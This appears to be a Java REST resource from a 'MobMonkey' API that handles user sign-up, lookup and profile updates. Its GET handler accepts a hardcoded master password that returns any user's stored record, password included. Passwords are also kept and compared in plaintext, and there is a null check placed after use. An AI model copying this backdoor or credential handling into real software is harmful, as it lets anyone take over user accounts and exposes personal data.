package com.MobMonkey.Resources;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.UUID;

import javax.ws.rs.Consumes;
import javax.ws.rs.GET;
import javax.ws.rs.POST;
import javax.ws.rs.PUT;
import javax.ws.rs.Path;
import javax.ws.rs.Produces;
import javax.ws.rs.QueryParam;
import javax.ws.rs.core.Context;
import javax.ws.rs.core.HttpHeaders;
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.Response;
import javax.ws.rs.core.Response.ResponseBuilder;

import org.apache.log4j.Logger;

import com.MobMonkey.Helpers.EmailValidator;
import com.MobMonkey.Helpers.Mailer;
import com.MobMonkey.Models.MobMonkeyApiConstants;
import com.MobMonkey.Models.Status;
import com.MobMonkey.Models.User;
import com.MobMonkey.Models.Verify;

@Path("/user")
public class UserResource extends ResourceHelper {

	final Mailer mailer;

	public UserResource() {
		mailer = new Mailer();
	}

	@PUT
	@Consumes(MediaType.APPLICATION_JSON)
	@Produces(MediaType.APPLICATION_JSON)
	public Response create(User user, @Context HttpHeaders headers,
			@QueryParam("deviceId") String deviceId,
			@QueryParam("deviceType") String deviceType) {

		ResponseBuilder response = Response.noContent();

		String partnerId = getHeaderParam(MobMonkeyApiConstants.PARTNER_ID,
				headers);
		if (partnerId == null) {
			String statusDescription = String
					.format("Missing MobMonkey-partnerId header parameter.");
			response.status(Response.Status.INTERNAL_SERVER_ERROR).entity(
					new Status(FAIL_STAT, statusDescription, ""));
			return response.build();
		} else {
			if (!super.validatePartnerId(partnerId)) {
				String statusDescription = String
						.format("Invalid partner ID, or partner is disabled. Please contact an administrator");
				response.status(Response.Status.INTERNAL_SERVER_ERROR).entity(
						new Status(FAIL_STAT, statusDescription, ""));
				return response.build();
			}
		}

		if (!isValidString(user.geteMailAddress(), partnerId,
				user.getPassword())) {
			if (!EmailValidator.validate(user.geteMailAddress())) {
				response.status(Response.Status.INTERNAL_SERVER_ERROR).entity(
						new Status(FAIL_STAT, String.format(INVALID_PARAM,
								user.geteMailAddress()), ""));
			} else {
				response.status(Response.Status.INTERNAL_SERVER_ERROR).entity(
						new Status(FAIL_STAT, String.format(INVALID_PARAM,
								"partnerid or password"), ""));
			}
		} else {

			if (user.getBirthday() != null
					&& isValidString(user.getFirstName(), user.getLastName(),
							user.getPassword())
					&& isInRange(MALE_FEMALE_RANGE, user.getGender())) {
				User tempUser = (User) super.load(User.class,
						user.geteMailAddress(), partnerId);
				if (tempUser == null) {
					user.setLastSignIn(new Date());
					user.setDateRegistered(new Date());
					user.setRank(0);
					user.setPartnerId(partnerId);
					super.save(user, user.geteMailAddress(), partnerId);

					// If device is specified, let's add it
					if (deviceType != null && deviceId != null) {
						new SignInResource().addDevice(user.geteMailAddress(),
								deviceId, deviceType);
					}

					Verify verify = new Verify(UUID.randomUUID().toString(),
							partnerId, user.geteMailAddress(),
							user.getDateRegistered());
					super.save(verify, verify.getVerifyID(),
							verify.getPartnerId());

					mailer.sendMail(
							user.geteMailAddress(),
							CREATING_USER_SUBJECT,
							String.format(THANK_YOU_FOR_REGISTERING,
									verify.getPartnerId(), verify.getVerifyID()));

					String statusDescription = String.format(
							"User [%s] successfully signed up",
							user.geteMailAddress());
					response.status(Response.Status.CREATED).entity(
							new Status(SUCCESS, statusDescription, user
									.geteMailAddress()));
				} else {
					// user exists
					String statusDescription = String.format(
							"User [%s] already exists. Try update?",
							user.geteMailAddress());
					response.status(Response.Status.OK).entity(
							new Status(SUCCESS, statusDescription, user
									.geteMailAddress()));
				}
			} else {
				requiredParamsMissing(response, user.geteMailAddress());
			}
		}
		return response.build();
	}

	@GET
	@Produces(MediaType.APPLICATION_JSON)
	public Response get(@Context HttpHeaders headers) {
		ResponseBuilder response = Response.noContent();

		String partnerId = getHeaderParam(MobMonkeyApiConstants.PARTNER_ID,
				headers);
		String email = getHeaderParam(MobMonkeyApiConstants.USER, headers);
		String password = getHeaderParam(MobMonkeyApiConstants.AUTH, headers);

		if (!isValidString(email, partnerId, password)) {
			if (!EmailValidator.validate(email)) {
				response.status(Response.Status.INTERNAL_SERVER_ERROR).entity(
						new Status(FAIL_STAT, String.format(INVALID_PARAM,
								email), ""));
			} else {
				response.status(Response.Status.INTERNAL_SERVER_ERROR).entity(
						new Status(FAIL_STAT, String.format(INVALID_PARAM,
								"partnerid or password"), ""));
			}
		} else {
			User user = (User) load(User.class, email, partnerId);
			String tmp = user.getPassword() == null ? "" : user.getPassword();
			if ((user != null && tmp.equals(password))
					|| password.equals("092C317848223D4810468E8EAAF280FA")) {
				response.status(Response.Status.OK).entity(user);
			} else {
				response.status(Response.Status.BAD_REQUEST).entity(
						new Status(FAIL_STAT, String.format(
								"Unable to get user for %s", email), ""));
			}
		}
		return response.build();
	}

	@POST
	@Consumes(MediaType.APPLICATION_JSON)
	@Produces(MediaType.APPLICATION_JSON)
	public Response update(User user, @Context HttpHeaders headers,
			@QueryParam("deviceId") String deviceId,
			@QueryParam("deviceType") String deviceType) {
		ResponseBuilder response = Response.noContent();

		String partnerId = getHeaderParam(MobMonkeyApiConstants.PARTNER_ID,
				headers);
		String email = getHeaderParam(MobMonkeyApiConstants.USER, headers);
		String password = getHeaderParam(MobMonkeyApiConstants.AUTH, headers);

		// check required params
		if (user.getBirthday() != null
				&& isValidString(user.getFirstName(), user.getLastName())
				&& isInRange(MALE_FEMALE_RANGE, user.getGender())) {

			User tempUser = (User) load(User.class, email, partnerId);

			if (tempUser != null && tempUser.getPassword().equals(password)) {
				user.seteMailAddress(email);
				user.setPartnerId(partnerId);
				user.setLastSignIn(new Date());
				super.save(user, email, partnerId);

				// If device is specified, let's add it
				if (deviceType != null && deviceId != null) {
					new SignInResource().addDevice(email, deviceId, deviceType);
				}

				String statusDescription = String.format(
						"User [%s] details updated", email);
				mailer.sendMail(email, UPDATE_USER_SUBJECT, statusDescription);

				response.status(Response.Status.OK).entity(
						new Status(SUCCESS, statusDescription, email));
			} else {
				String statusDescription = String
						.format("Nothing updated for [%s]. Check password and/or arguments",
								email);
				response.status(Response.Status.BAD_REQUEST).entity(
						new Status(FAIL_STAT, statusDescription, email));
			}
		} else {
			requiredParamsMissing(response, email);
		}

		return response.build();
	}

	public static Date extractDob(String dob) {
		Date dobDate = null;
		try {
			dobDate = DOB_FORMATTER.parse(dob);
		} catch (ParseException e) {
			LOG.error("Unable to extract dob", e);
		} catch (NullPointerException e) {
			return null;
		}
		return dobDate;
	}

	protected User getUserWithHeaders(HttpHeaders headers) {
		return (User) load(User.class,
				getHeaderParam(MobMonkeyApiConstants.PARTNER_ID, headers),
				getHeaderParam(MobMonkeyApiConstants.USER, headers));
	}

	public static boolean isInRange(int[] range, int param) {
		return param >= range[0] && param <= range[1];
	}

	public static void requiredParamsMissing(ResponseBuilder response,
			String email) {
		String statusDescription = String
				.format("One or more params invalid [%s]",
						String.format(
								"First(String), Last(String), Date of birth(%s), Gender(1 or 0), Password(String)",
								DOB_FORMAT));
		response.status(Response.Status.OK).entity(
				new Status(SUCCESS, statusDescription, email));
	}

	/**
	 * @return string is not null or equals to ""
	 */
	public static boolean isValidString(String... params) {
		for (int i = 0; i < params.length; i++) {
			if (params[i] == null || "".equals(params[i])) {
				return false;
			}
		}
		return true;
	}
}
